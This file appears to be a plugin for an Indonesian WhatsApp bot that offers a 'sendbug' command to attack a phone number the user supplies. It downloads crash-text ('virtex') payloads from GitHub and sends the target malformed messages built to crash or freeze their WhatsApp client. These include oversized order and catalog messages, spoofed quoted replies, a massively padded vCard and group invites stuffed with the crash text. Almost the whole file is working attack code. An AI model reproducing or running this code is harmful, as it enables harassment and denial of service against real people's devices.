/*import generateWAMessageFromContent, prepareWAMessageMedia, proto from '@adiwajshing/baileys'*/
let { generateWAMessageFromContent, prepareWAMessageMedia, proto } = (await import('@adiwajshing/baileys')).default
import moment from 'moment-timezone'
import fetch from 'node-fetch'
import fs from 'fs'
import { sticker } from '../lib/sticker.js'
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender
let name = conn.getName(who)
if (!text)return conn.send2ButtonImg(m.chat, `https://telegra.ph/file/c080917609684bf229cd3.jpg`, `${gcname}`,`*Nomor Yang Mau Diattack Mana Cuy?*\n\n${botdate}`,
     'Owner','.owner',
       'Donasi','.donasi'
       )
      
let thumb = fs.readFileSync('./thumbnail.jpg')
let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
let viruswan = await (await fetch("https://raw.githubusercontent.com/WannBotz/virus/main/virtex1.txt")).text()
let type = (args[0] || '').toLowerCase()
const from = m.key.remoteJid
//const participants = m.isGroup ? await groupMetadata.participants : ''
let q = `Mᴀᴍᴘᴜsʟᴜ\n${text}`
let sections = 
[
{
title: `${gcname}`,
rows: [
{ title: 'Bug Pdf', rowId: `${_p}${command} pdf ${text}` },
{ title: 'Bug Catalog', rowId: `${_p}${command} bugcatalog ${text}` },
{ title: 'Bug Vn', rowId: `${_p}${command} vn ${text}` },
{ title: 'Bug Stik', rowId: `${_p}${command} sticker ${text}` },
{ title: 'Bug Img', rowId: `${_p}${command} bugimg ${text}` },
{ title: 'Bug Video', rowId: `${_p}${command} bugvid ${text}` },
{ title: 'Bug Invite', rowId: `${_p}${command} buginv ${text}` },
{ title: 'Bug Vrash', rowId: `${_p}${command} bugcrash ${text}` },
{ title: 'Bug Kontak', rowId: `${_p}${command} bugkontak ${text}` }, 
{ title: 'Bug React', rowId: `${_p}${command} reactpc ${text}` },        
{ title: 'Bug Text Crash', rowId: `${_p}${command} bugtextcrash ${text}` },]}]
    let listMessage = {
      text: `${gcname}`,
      footer: `*Hallo ${name}\nSilahkan Pilih Mau DiSendbug Apa Nichh?*`,
      buttonText: 'Click Here!',
      sections
      }

//==================( Quoted ) =================//
const shield2 = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: 'status@broadcast'
  },
  message: {
    "imageMessage": {
        "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
        "mimetype": "image/jpeg",
        "caption": "ALDI GANZ",
        "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
        "fileLength": "28777",
        "height": 1080,
        "width": 1079,
        "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
        "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
        "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
        "mediaKeyTimestamp": "1610993486",
        "jpegThumbnail": fs.readFileSync('./thumbnail.jpg'),
        "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
     }
  }
}
//# Kal
const kal = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
},
"message": {
"extendedTextMessage": {
"text": `${wm}`,
"previewType": "NONE",
"contextInfo": {
"stanzaId": "3EB0382EDBB2",
"participant": "@s.whatsapp.net"
	}}}}	
//=================================================//		
//# Troli
const trol = { 
key: {
fromMe: false, 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
},
"message": {
"orderMessage": {
						"orderId": "594071395007984",
						"thumbnail": fs.readFileSync('./thumbnail.jpg'),
						"itemCount": 100000000000,
						"status": "INQUIRY",
						"surface": "CATALOG",
						"message": "",
						"orderTitle": `${wm}`,
						"sellerJid": "62857887347569@s.whatsapp.net",
						"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
						"totalAmount1000": "500000000000000",
						"totalCurrencyCode": "IDR"
	}}}
//#Troli 2
const ftrolii ={key: {fromMe: false,
"participant":"0@s.whatsapp.net", 
"remoteJid": "@g.us"},
"message": {orderMessage: 
{itemCount: 100000000000,
status: 200, 
thumbnail: thumb, 
surface: 200, 
message: `© ${wm}`,
token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
totalAmount1000: "500000000000000",
totalCurrencyCode: "IDR",
orderTitle: `${wm} ${virus2}`,
sellerJid: '0@s.whatsapp.net'}}, 
contextInfo: {"forwardingScore":999,"isForwarded":true},
sendEphemeral: true}	
//=================================================//	
// doc
const doc = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {}) 
},
"message": {
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
"mimetype": "application/octet-stream",
"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
"fileLength": "64455",
"pageCount": 1,
"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
"fileName": `${viruswan}`,
"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk="
}}}
 //Sticker
const bugstik = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
 "orderMessage": {
"orderId": "594071395007984",
"thumbnail": fs.readFileSync('./thumbnail.jpg'),
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${gcname}`,
"orderTitle": `${gcname}`,
"sellerJid": "62857887347569@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR"
            } 
        }}
//=================================================//
//# Pdf
const bugpdf = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        message: { 
            "imageMessage": { 
                "mimetype": "image/jpeg", 
                "caption": `${wm}`, 
                "jpegThumbnail": thumb
            } 
        } 
    }
//=================================================//   
//# Vn
const adehvn = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
"locationMessage": {}
            } 
        } 
//=================================================//       
//# Image
const bugimage = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 9999999999,
"caption": `${wm}`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
            } 
        } 
    }
//=================================================//        
const messa = await prepareWAMessageMedia({ image: fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `${wm}`,
"description": `${virus2}`,
"currencyCode": "IDR",
"bodyText": `${virus}`,
"footerText": `${wm}`,
"priceAmount1000": "10000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `${wm}`,
"url": "wa.me/62881037044211"
},
"businessOwnerJid": "62881037044211@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: ftrolii })    
//=================================================//    
//# Contact
const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${wm}${viruswan}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${wm}${viruswan}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  
//=================================================//   
//# Text
const main = {
  "key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
...({"remoteJid":''})
  },
  "message":{
"imageMessage":{
  "mimetype":"image/jpeg",
  "jpegThumbnail":fs.readFileSync('./thumbnail.jpg')
}
  }
}
//=================================================//   
   
switch (type) {

case 'vn': {
 conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})
//await m.reply(`Berhasil Mengirim Bug Vn Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'pdf': {
 conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})
//await m.reply(`Berhasil Mengirim Bug Pdf Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'sticker': {
let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
conn.sendFile(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})
//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'bugimg': {
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, bugimage }, {quoted: bugimage})
}
break
case 'bugcrash': {
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)

}
break
case 'bugkontak': {
let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {
"contactMessage": {
"vcard": "HAHaAhHAHAHA",
"displayName": `HyzerDev`,
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
}
}, {quoted: fkontaak, contextInfo:{}}) 
conn.relayWAMessage(res)
//await m.reply(`Berhasil Mengirim ${type} Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'reactpc': {
await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${wm}` }, {quoted: trol})
//await m.reply(`Berhasil Mengirim Bug React Di Nomer ${text}@s.whatsapp.net`)
}
break
case 'bugtag': {
if (!m.isGroup) return global.dfail('group',m,conn)
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })
}
break
case 'bugcatalog': {
conn.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', catalog.message, { messageId: catalog.key.id })
}
break
case 'bugtextcrash': {
conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${wm}`, main)
}
break
case 'bugvid': {
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {video: thumb, bugimage, }, {quoted: bugimage})
}
break
case 'buglist':{
sections = [
{
title: `Fixed\n${virus}`,
 rows: [
{title: virus, rowId: `Jembod`, description: `Hai \nAWGWG MAMPUS><`},
{title: virus2, rowId: `Jembod`, description: `Hai \nAWGWG MAMPUS><`},
{title: virus, rowId: `Jembod`, description: `Hai \nAWGWG MAMPUS><`}
]}]
let listMessage = {
      text: `Halo Bang\n${virus}`,
      footer: wm,
      buttonText: `🥶⃟ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ  Klick Ini Boz⧽̶̶͜🥵̶͜🔥\n-${virus2}̶`,
      sections
      }
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', listMessage, {quoted: fkontak})
/*
jobotz.sendListMsg(m.chat, `Script Di List\n${philips}`, jobotz.user.name, `THE JO BOT`, `THE JO BOT\n-${job`, des, shield2)*/
}
break
case 'buginvite': {
let farizcoli = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© THE JO BOT${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:THE JO BOT\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
var messaa = await prepareWAMessageMedia({ image: fs.readFileSync('./thumbnail.jpg') }, { upload: conn.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁${virus2}`,
"groupName": `𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁${virus2}`,
"caption": `${virus2}`,
"jpegThumbnail": messaa.imageMessage,
}
}), { userJid: m.chat, quoted: farizcoli })
conn.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', groupInvite.message, { messageId: groupInvite.key.id })
}
break

             default:
            if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
            throw false
            }
let bcbg = `https://telegra.ph/file/c080917609684bf229cd3.jpg`

       conn.send3ButtonImg(m.chat, bcbg, gcname, `*Sukses Mengirim Ke Nomor: ${text}@s.whatsapp.net\n\n${botdate}`,
   'Menu','.menu',
     'Owner','.owner',
       'Donasi','.donasi'
       )

     

            }
handler.help = ['sendbug <number>']
handler.tags = ['virus']
handler.command = /^(kirimviruske|sendcrash|sendbug|sendtroli)$/i
handler.premium = true
handler.owner = false

export default handler